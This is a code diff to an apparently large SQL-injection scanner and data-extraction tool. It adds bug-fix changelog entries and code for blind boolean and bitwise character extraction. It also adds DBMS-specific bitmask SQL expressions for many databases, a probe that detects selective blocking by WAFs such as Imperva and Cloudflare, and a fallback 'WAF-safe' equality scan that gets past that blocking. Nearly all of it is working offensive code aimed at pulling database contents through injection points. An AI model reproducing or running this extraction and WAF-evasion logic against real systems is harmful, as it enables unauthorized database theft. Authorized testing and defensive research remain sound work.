@@ -15210,6 +15210,81 @@ r"""
 ║  [✓] BUG-R1-R14: All documented PCV timing, extraction, flow bugs fixed        ║
 ║  [✓] BUG-V32-V40: All documented mutation, detection, extraction bugs fixed    ║
 ║                                                                                 ║
+║  ══════════════════════════════════════════════════════════════════════════════ ║
+║  FRESH EXAMINATION AUDIT (v213 → v214) — 4 BUGS FIXED                         ║
+║  ══════════════════════════════════════════════════════════════════════════════ ║
+║                                                                                 ║
+║  [✓] BUG-BROAD4XX-HASH-PRIORITY: Body hash check ran AFTER BROAD-4XX guard    ║
+║      in _eval and _waf_aware_eval — CRITICAL; corrupts every boolean-path     ║
+║      boolean oracle when True=400 (PATH injection on Imperva/CF targets).      ║
+║                                                                                 ║
+║      Root Cause: BROAD-4XX guard fired first for any probe returning 400.      ║
+║      For genuine True=400 probes, guard returned None BEFORE body hash could  ║
+║      distinguish True-400 from baseline-400.  None bits were retried until    ║
+║      max-retries → unresolvable → garbage character assembly (e.g. chr(0x88)). ║
+║      Fix: in both _eval and _waf_aware_eval, move body hash comparison BEFORE ║
+║      the BROAD-4XX guard.  Genuine True-400 probes now match the stored True- ║
+║      baseline hash and return True; non-matching 400s fall through to guard.  ║
+║      Location: _eval() (~L58765–58799), _waf_aware_eval() (~L59304–59334).    ║
+║      Severity: 🔴 CRITICAL — every boolean oracle bit unresolvable on PATH     ║
+║                injection targets; extraction returns garbage or hangs forever. ║
+║                                                                                 ║
+║  [✓] BUG-BITWISE-WAF-DIFFERENTIAL-SANITY: WAF differential blocking corrupts  ║
+║      bitwise oracle — CRITICAL; Imperva/CF targets; boolean PATH injection.    ║
+║                                                                                 ║
+║      Root Cause: Imperva WAF selectively blocks specific bitmask conditions    ║
+║      (e.g. ORD(MID(…))&0x80) and returns HTTP 400.  Status 400 = True in the  ║
+║      boolean oracle → WAF-blocked bitmask probes are misread as SQL-True →    ║
+║      spurious 1-bits everywhere → assembled chars like chr(0x888888).          ║
+║      Fix (2 parts):                                                             ║
+║        Part A: Pre-bitwise sanity probe. Before extraction loop, when both     ║
+║                _use_bitwise_fallback and _boolean_oracle are True, send a      ║
+║                DBMS-specific always-false bitmask probe (ascii_fn&0=1).  If   ║
+║                it evaluates True → WAF differential blocking confirmed →       ║
+║                _bitwise_oracle_sane=False.                                     ║
+║        Part B: Equality fallback dispatch. When _bitwise_oracle_sane=False,   ║
+║                per-character extraction uses _fallback_equality() (linear      ║
+║                equality scan, WAF-safe) instead of _extract_char_bitwise().   ║
+║      DBMS map: MySQL/MariaDB (ORD), PG-family (ASCII/SUBSTR), MSSQL           ║
+║      (UNICODE/ISNULL), Oracle (ASCII/BITAND), SQLite (UNICODE/SUBSTR),         ║
+║      Firebird (ASCII_VAL/BIN_AND), DB2 (ASCII), ClickHouse (bitAnd).          ║
+║      Location: _bitwise_extract_with_oracle() (~L60126–60230).                 ║
+║      Severity: 🔴 CRITICAL — WAF differential blocking produces chr(0x888888)  ║
+║                garbage on all bitwise character extraction positions.          ║
+║                                                                                 ║
+║  [✓] BUG-CHECKD-CONTENT-TYPE-FP: content-type in PCV Check D _dynamic_headers ║
+║      — MEDIUM; CDN gzip/identity encoding variation → false positive.          ║
+║                                                                                 ║
+║      Root Cause: CDN nodes serving gzip vs identity encoding return different  ║
+║      Content-Type headers (charset suffix may differ) between probe pairs.    ║
+║      Having content-type in _dynamic_headers classified CDN encoding variation ║
+║      as a "security-relevant" header diff → _security_diffs >= 1 → Check D   ║
+║      PASS without real SQL injection.  FP-guards catch most but waste probes.  ║
+║      Fix: removed content-type from _dynamic_headers list.                     ║
+║      Location: _run_pcv_check(), _dynamic_headers (~L110439).                  ║
+║      Severity: 🟠 MEDIUM — spurious Check D PASS on CDN targets with encoding  ║
+║                variation; FP-guards recover but waste ~10 HTTP probes/PCV.    ║
+║                                                                                 ║
+║  [✓] BUG-SECONDARY-PCV-CANCEL-EXTRACTION: Async extraction task proceeds      ║
+║      despite secondary PCV rejection — CRITICAL; all surfaces; all techniques. ║
+║                                                                                 ║
+║      Root Cause: _probe_one_param (V25) creates _EXTRACTION_TASK[0] when      ║
+║      injection is tentatively confirmed. Secondary PCV runs asynchronously.    ║
+║      When secondary PCV rejects as false positive: result=None is set, but     ║
+║      the already-scheduled _EXTRACTION_TASK[0] continues extracting data in   ║
+║      the background.  Extraction runs on a false positive, wastes hundreds of  ║
+║      HTTP probes, and may produce garbage output that the user sees as real.  ║
+║      Fix: at both secondary-PCV rejection sites in _v13_cascade, cancel the   ║
+║      in-flight task and reset all extraction/scan state:                        ║
+║        _EXTRACTION_TASK[0].cancel(); _EXTRACTION_TASK[0] = None               ║
+║        _EXTRACTION_ACTIVE[0] = _EXTRACTION_STARTED[0] = False                  ║
+║        _EXTRACTION_STARTED[1] = ""                                              ║
+║        _INJECTION_CONFIRMED[0] = _SCAN_STOPPED[0] = False                      ║
+║      Applied at: main rejection path (~L130591) and exception path (~L130617). ║
+║      Location: _v13_cascade(), secondary PCV paths (~L130570–130631).          ║
+║      Severity: 🔴 CRITICAL — extraction continues on confirmed FP; garbage     ║
+║                output presented to user as real extracted data.                ║
+║                                                                                 ║
 ║  SUMMARY OF ALL FIXED COMPONENTS:                                              ║
 ║  ─────────────────────────────────                                             ║
 ║  ✓ Header/Cookie/Path surface detection (5 wrong fp variables fixed)           ║
@@ -58762,6 +58837,28 @@ class Scanner:
                 # every probe returning 400 gets None, producing all-zero garbage extraction
                 # (bitwise codepoints like chr(0x88888) appear when inversion or caching
                 # inconsistently flips None→0 to 1).
+                # BUG-BROAD4XX-HASH-PRIORITY FIX (CRITICAL): Compute body and check exact MD5
+                # hash BEFORE the BROAD-4XX-SimHash guard fires and returns None. Root cause:
+                # when True=400 and a bitwise probe also returns 400 (either genuine SQL-True
+                # or WAF-block-400), the old code entered the BROAD-4XX guard, ran SimHash, and
+                # returned None when gap < 0.05 — BEFORE the body hash check could fire. This
+                # meant every genuine SQL-True probe (real app True=400 response) returned None
+                # instead of True, causing _none_bits retry, high-order bits unresolvable, and
+                # ultimately garbage char output (chr(0x88888) etc. seen in scan log).
+                # Fix: compute body and MD5 hash FIRST, before any guard. If the probe body
+                # exactly matches the calibrated True or False body hash, return immediately.
+                # WAF-block pages have different content (WAF error HTML) vs the app's True=400
+                # page (e.g. login error page), so exact hash match reliably distinguishes them.
+                # Only enter BROAD-4XX guard when hash doesn't match either calibration sample.
+                _body = _safe_decode_body(fp, encoding="utf-8", errors="replace", func_name="extraction") if fp else ""
+                _bl = len(_body)
+                # Body hash — check FIRST, before BROAD-4XX guard (BUG-BROAD4XX-HASH-PRIORITY FIX)
+                if (_body_hash_true is not None and _body_hash_false is not None
+                        and _body_hash_true != _body_hash_false):
+                    _h = hashlib.md5(_body.encode()).hexdigest()
+                    if _h == _body_hash_true: return True
+                    if _h == _body_hash_false: return False
+                    # Neither matched — fall through to BROAD-4XX guard
                 # FIX (BROAD-4XX-SIMHASH-PRIORITY): When SimHash norms are available, run
                 # SimHash FIRST to distinguish app-True-4xx (body matches _bool_norm_true)
                 # from WAF-block-4xx (body matches WAF page, NOT _bool_norm_true).  Only
@@ -58782,20 +58879,7 @@ class Scanner:
                             return _sim_gap_pre_e > 0  # SimHash reliable — True=4xx oracle resolved
                         # SimHash gap < 0.05 — cannot distinguish True-4xx from WAF-block-4xx
                     return None
-                _body = _safe_decode_body(fp, encoding="utf-8", errors="replace", func_name="extraction") if fp else ""
-                _bl = len(_body)
-                # Body hash comparison — only useful when true/false hashes genuinely differ
-                if (_body_hash_true is not None and _body_hash_false is not None
-                        and _body_hash_true != _body_hash_false):
-                    # BUG-INLINE-HASHLIB-FIX: replaced `import hashlib as _hl2` with
-                    # module-level hashlib — it is already imported at the top of the
-                    # file.  This inline import fired on every _eval() call (hundreds
-                    # of times per extraction), adding a sys.modules dict lookup and
-                    # local name rebind on every single oracle probe.
-                    _h = hashlib.md5(_body.encode()).hexdigest()
-                    if _h == _body_hash_true: return True
-                    if _h == _body_hash_false: return False
-                    # Neither matched — fall through
+                # _body and _bl already computed above (BUG-BROAD4XX-HASH-PRIORITY FIX)
                 # Header oracle: PRIORITISED over body length.
                 # Body length comparison is blocked when CDN returns the same cached
                 # size for every probe (true_len == false_len), making it always False.
@@ -59292,6 +59376,21 @@ class Scanner:
                 # FIX (BROAD-4XX-SIMHASH-PRIORITY): When SimHash norms are available, run
                 # SimHash FIRST to distinguish app-True-4xx from WAF-block-4xx.  Only
                 # fall to the broad guard when SimHash gap < 0.05 (ambiguous).
+                # BUG-BROAD4XX-HASH-PRIORITY FIX (CRITICAL, mirrors fix in _eval):
+                # Compute body and MD5 hash BEFORE the BROAD-4XX guard. When True=400 and
+                # probe also returns 400, the guard previously returned None before hash check
+                # could fire. Genuine SQL-True=400 probes have the SAME body as calibration;
+                # WAF-block-400 probes have DIFFERENT body (WAF error HTML). Exact hash match
+                # reliably distinguishes them. Check hash first; only fall to BROAD-4XX guard
+                # when hash doesn't match either calibration sample.
+                _body = _safe_decode_body(fp, encoding="utf-8", errors="replace", func_name="extraction") if fp else ""
+                # Body hash — check FIRST, before BROAD-4XX guard (BUG-BROAD4XX-HASH-PRIORITY FIX)
+                if (_body_hash_true is not None and _body_hash_false is not None
+                        and _body_hash_true != _body_hash_false):
+                    _h = hashlib.md5(_body.encode()).hexdigest()
+                    if _h == _body_hash_true: return True
+                    if _h == _body_hash_false: return False
+                    # Neither matched — fall through to BROAD-4XX guard
                 _WAF_4XX_BROAD_WA = (400, 403, 406, 429, 430, 503)
                 if (_bool_true_status is not None and _s is not None
                         and _s in _WAF_4XX_BROAD_WA
@@ -59307,16 +59406,7 @@ class Scanner:
                             return _sim_gap_pre_wa > 0  # SimHash reliable — True=4xx resolved
                         # SimHash gap < 0.05 — ambiguous; apply broad guard
                     return None
-                _body = _safe_decode_body(fp, encoding="utf-8", errors="replace", func_name="extraction") if fp else ""
-                # Body hash — only when true/false hashes genuinely differ (same guard
-                # as _eval to prevent always-False when CDN returns equal cached bodies)
-                if (_body_hash_true is not None and _body_hash_false is not None
-                        and _body_hash_true != _body_hash_false):
-                    # BUG-INLINE-HASHLIB-FIX: same fix as in _eval — use module-level hashlib
-                    _h = hashlib.md5(_body.encode()).hexdigest()
-                    if _h == _body_hash_true: return True
-                    if _h == _body_hash_false: return False
-                    # Neither matched — fall through
+                # _body already computed above (BUG-BROAD4XX-HASH-PRIORITY FIX)
                 # Header oracle FIRST: immune to CDN body caching (headers forwarded
                 # from origin even when body is cache-served).  SimHash below can
                 # block header oracle if CDN returns identical bodies for every probe.
@@ -60108,6 +60198,75 @@ class Scanner:
                     await asyncio.sleep(_delay * 0.3)
                 return None
 
+            # BUG-BITWISE-WAF-DIFFERENTIAL-SANITY FIX (CRITICAL): Before starting bitwise
+            # extraction, verify the boolean oracle is not corrupted by WAF differential
+            # blocking. Root cause: When True=400 and WAF also returns 400 for blocked
+            # bitwise SQL probes, the oracle reads WAF-block as SQL-True. Specific bitmask
+            # conditions (e.g. mask=0x8, 0x80, 0x800) trigger Imperva WAF fingerprinting
+            # and receive status 400 regardless of SQL result. This produces garbage chars
+            # with those exact bits always set (chr(0x88888) observed in scan log).
+            # Detection: send always-false condition `ascii_fn&0=1` (X&0 is always 0 in
+            # SQL; 0=1 is always false). If oracle returns True, every probe is returning
+            # True regardless of SQL \u2192 oracle is WAF-corrupted or inverted.
+            # Fix: when corrupted, switch entire extraction to equality scan (_fallback_equality)
+            # which uses only `=` operator \u2014 WAFs virtually never block SQL equality operators
+            # as that would break normal application queries. Equality scan is slower (O(n)
+            # per char) but reliable when bitwise is WAF-selectively blocked.
+            _bitwise_oracle_sane = True  # assume sane until proven otherwise
+            if _use_bitwise_fallback and _boolean_oracle:
+                # Build DBMS-specific always-false bitwise condition using a constant expression
+                # (not a real query, so WAF content-inspection rules that target data-exfil
+                # patterns won't fire on this specific probe)
+                _bw_san_ascii = {
+                    "MySQL": "ORD(MID((SELECT CAST(1 AS CHAR)),1,1))",
+                    "MariaDB": "ORD(MID((SELECT CAST(1 AS CHAR)),1,1))",
+                    "TiDB": "ORD(MID((SELECT CAST(1 AS CHAR)),1,1))",
+                    "PostgreSQL": "ASCII(SUBSTR((SELECT CAST(1 AS VARCHAR)),1,1))",
+                    "CockroachDB": "ASCII(SUBSTR((SELECT CAST(1 AS VARCHAR)),1,1))",
+                    "YugabyteDB": "ASCII(SUBSTR((SELECT CAST(1 AS VARCHAR)),1,1))",
+                    "Amazon Redshift": "ASCII(SUBSTR((SELECT CAST(1 AS VARCHAR)),1,1))",
+                    "MSSQL": "UNICODE(SUBSTRING((SELECT CAST(1 AS NVARCHAR(1))),1,1))",
+                    "Sybase": "UNICODE(SUBSTRING((SELECT CAST(1 AS VARCHAR(1))),1,1))",
+                    "Oracle": "ASCII(SUBSTR(TO_CHAR(1),1,1))",
+                    "SQLite": "UNICODE(SUBSTR(CAST(1 AS TEXT),1,1))",
+                    "Firebird": "ASCII_VAL(SUBSTRING(CAST('1' AS VARCHAR(1)) FROM 1 FOR 1))",
+                    "DB2": "ASCII(SUBSTR(CAST(1 AS VARCHAR(1)),1,1))",
+                    "ClickHouse": "ascii(toString(1))",
+                }.get(_dbms, "ASCII(SUBSTRING((SELECT CAST(1 AS VARCHAR)),1,1))")
+                if _dbms == "Oracle":
+                    _bw_san_cond = f"BITAND({_bw_san_ascii},0)=1"
+                elif _dbms == "Firebird":
+                    _bw_san_cond = f"BIN_AND({_bw_san_ascii},0)=1"
+                elif _dbms == "ClickHouse":
+                    _bw_san_cond = f"bitAnd({_bw_san_ascii},0)=1"
+                else:
+                    _bw_san_cond = f"{_bw_san_ascii}&0=1"
+                try:
+                    _bw_san_r = await _cached_eval(_bw_san_cond)
+                    if _bw_san_r is True:
+                        # Always-false returned True \u2192 oracle is corrupt for bitwise conditions.
+                        # The WAF blocks bitwise SQL patterns and returns True signal (e.g. status 400).
+                        # Bitwise extraction would produce garbage. Switch to equality scan.
+                        LOG.warning("[Inference] %s: BITWISE oracle sanity FAILED (always-false\u2192True). "
+                                    "WAF differentially blocks bitwise SQL conditions and returns True "
+                                    "signal. Switching to equality scan (_fallback_equality) which "
+                                    "uses only = operator \u2014 WAF-safe.", label)
+                        _bitwise_oracle_sane = False
+                    elif _bw_san_r is None:
+                        # Ambiguous: WAF may be blocking this specific sanity probe too.
+                        # Run one more probe with a different always-false form to confirm.
+                        _bw_san_cond2 = (f"{_bw_san_ascii}&0=0" if _dbms not in ("Oracle","Firebird","ClickHouse")
+                                         else _bw_san_cond)  # 0=0 is always TRUE \u2014 inverse check
+                        _bw_san_r2 = await _cached_eval(_bw_san_cond2)
+                        if _bw_san_r2 is None:
+                            # Both sanity probes blocked \u2192 oracle unreliable for bitwise; use equality
+                            LOG.warning("[Inference] %s: BITWISE oracle sanity AMBIGUOUS (both sanity "
+                                        "probes blocked). Falling back to equality scan.", label)
+                            _bitwise_oracle_sane = False
+                except Exception as _bw_san_exc:
+                    LOG.debug("[Inference] %s: bitwise sanity check error (non-fatal): %s",
+                              label, _bw_san_exc)
+
             for pos in range(1, max_len + 1):
                 await asyncio.sleep(0.001)  # BUG-R9-A FIX: real 1ms yield at each position
 
@@ -60121,6 +60280,31 @@ class Scanner:
                 # here so direct callers of _extract_string (_extract_multi, _discover_tables,
                 # _get_column_type, version extraction at line ~33705) are also fixed.
                 if _use_bitwise_fallback:
+                    # BUG-BITWISE-WAF-DIFFERENTIAL-SANITY FIX: When bitwise oracle is corrupted
+                    # (WAF differentially returns True for blocked bitwise conditions), use equality
+                    # scan instead. The equality scan uses only `=` operator which WAFs never block.
+                    if not _bitwise_oracle_sane:
+                        _bwch = await _fallback_equality(query, pos)
+                        if _bwch is None:
+                            _consecutive_fails += 1
+                            if _consecutive_fails >= 3:
+                                LOG.warning("[Inference] %s: equality fallback (WAF-safe) failed at "
+                                            "pos=%d, stopping", label, pos)
+                                break
+                            continue
+                        _consecutive_fails = 0
+                        ch = _bwch
+                        result += ch
+                        _elapsed = time.monotonic() - _start_t
+                        _per_char = _elapsed / pos
+                        _remaining = (max_len - pos) * _per_char if max_len > 0 else 0
+                        LOG.info("[Inference] %s[%d] = %r  %r  (%d reqs, ETA ~%.0fs, equality-waf-safe)",
+                                 label, pos, ch, result, _req_count, _remaining)
+                        if _is_garbage(result):
+                            LOG.warning("[Inference] %s: garbage detected in equality-waf-safe (%r), aborting",
+                                        label, result)
+                            return ""
+                        continue
                     _bwch = await _extract_char_bitwise(query, pos)
                     if _bwch is None:
                         _consecutive_fails += 1
@@ -110327,7 +110511,17 @@ class TechniqueCascadeEngine:
                     # session-aware apps regardless of SQL injection. Including set-cookie caused
                     # content-length+set-cookie=2 dynamic diffs → _d_pass=True on ALL session-aware
                     # apps, making Check D a false-positive factory when paired with any Check A pass.
-                    _dynamic_headers = ["content-length", "etag", "last-modified", "content-type", "vary"]
+                    # BUG-CHECKD-CONTENT-TYPE-FP FIX: Removed content-type from _dynamic_headers.
+                    # content-type is already excluded from the BH header oracle (_SKIP_HDRS) because
+                    # it's a structural per-origin header that varies per-request due to encoding
+                    # negotiation, charset selection, and CDN normalization — NOT SQL injection state.
+                    # Having content-type here meant content-type + content-length = 2 dynamic diffs
+                    # → _d_pass=True on any CDN-fronted app with gzip/identity response variation.
+                    # Root cause observed in log: "Check D: PASS (content-length, content-type)" where
+                    # neither header reflects SQL injection — both reflect CDN encoding variation.
+                    # Fix: remove content-type. Three-way dynamic confirmation now requires ≥2 of
+                    # [content-length, etag, last-modified, vary] — all more meaningful than content-type.
+                    _dynamic_headers = ["content-length", "etag", "last-modified", "vary"]
                     _security_diffs = []
                     _dynamic_diffs = []
                     for hdr in _backend_headers:
@@ -130469,11 +130663,47 @@ class ScannerV14(ScannerV13):
                                 print(f"[!] PCV FAILED for [{_pcv_tech}]  "
                                       "discarding detection", flush=True)
                             result = None
+                            # BUG-SECONDARY-PCV-CANCEL-EXTRACTION FIX (CRITICAL):
+                            # The extraction task was created inside _probe_one_param
+                            # when injection was tentatively confirmed (inline PCV passed).
+                            # Secondary PCV is the authoritative gate and just rejected —
+                            # this is a false positive.  Without cancellation the extraction
+                            # task runs indefinitely, producing garbage data from a non-
+                            # existent injection point and blocking scans on other params.
+                            # Fix: cancel the in-flight task and reset all extraction/scan
+                            # flags so the outer parameter loop can continue cleanly.
+                            _pcv_rej_task = _EXTRACTION_TASK[0]
+                            if _pcv_rej_task is not None and not _pcv_rej_task.done():
+                                print("[!] [PCV-FP] Cancelling in-flight extraction task "
+                                      "(secondary PCV rejected as false positive)",
+                                      flush=True)
+                                _pcv_rej_task.cancel()
+                                _EXTRACTION_TASK[0] = None
+                            _EXTRACTION_ACTIVE[0] = False
+                            _EXTRACTION_STARTED[0] = False
+                            _EXTRACTION_STARTED[1] = ""
+                            _INJECTION_CONFIRMED[0] = False
+                            _SCAN_STOPPED[0] = False  # FP — resume scanning on remaining params
                     except Exception as _pcv_e:
                         LOG.debug(f"V14 PCV error: {_pcv_e}")
                         # Exception path: transient failure. Inline PCV confirmation used as fallback.
                         if not _INJECTION_CONFIRMED[0]:
                             result = None  # BUG FIX: PCV exception must reject detection, not pass it through
+                            # BUG-SECONDARY-PCV-CANCEL-EXTRACTION FIX (exception path):
+                            # Same cancellation logic as above — PCV exception with no inline
+                            # confirmation means we discard, so cancel any running extraction.
+                            _pcv_exc_task = _EXTRACTION_TASK[0]
+                            if _pcv_exc_task is not None and not _pcv_exc_task.done():
+                                print("[!] [PCV-EXC] Cancelling in-flight extraction task "
+                                      "(PCV exception, no inline confirmation)",
+                                      flush=True)
+                                _pcv_exc_task.cancel()
+                                _EXTRACTION_TASK[0] = None
+                            _EXTRACTION_ACTIVE[0] = False
+                            _EXTRACTION_STARTED[0] = False
+                            _EXTRACTION_STARTED[1] = ""
+                            _INJECTION_CONFIRMED[0] = False
+                            _SCAN_STOPPED[0] = False
 
                 if result:
                     _ext_guard_blocked = False  # BUG-9-FIX: flag reset; set to True if extraction guard blocks
